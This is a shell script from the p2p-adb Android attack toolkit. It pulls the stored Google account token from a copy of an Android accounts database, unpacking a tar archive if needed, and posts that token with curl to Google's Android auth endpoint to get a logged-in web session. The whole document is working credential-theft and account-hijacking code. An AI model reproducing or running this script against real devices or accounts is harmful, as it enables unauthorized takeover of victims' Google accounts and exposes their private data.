# p2p-adb
# https://github.com/kosborn/p2p-adb/
# @theKos
# kyle@kyleosborn.com



DB="$1"
count=1

echo $DB | grep '.tar' 2>/dev/null >/dev/null
isTar=$?

if [ $isTar -eq 0 ]; then
	echo 'tar file, unpacking'
	DBPath=$(tar xvf "${DB}")
else
	DBPath=$1
fi

PASS=$(sqlite3 $DBPath "select password from accounts where _id=1")
droid=$(sqlite3 $DBPath "select type from accounts where _id=1")

while [ "$droid" != "com.google" ] && [ $count -ne 10 ]
do
	count=$((count+1))
	PASS=$(sqlite3 $DBPath "select password from accounts where _id=$count")
	droid=$(sqlite3 $DBPath "select type from accounts where _id=$count")
done

curl --data "accountType=&Email=&has_permission=1&Token=${PASS}&service=weblogin%3Acontinue%3Dhttps%253A//www.google.com/dashboard/&source=&androidId=&app=&client_sig=&device_country=&operatorCountry=&lang=&RefreshServices=" -k "https://android.clients.google.com/auth"
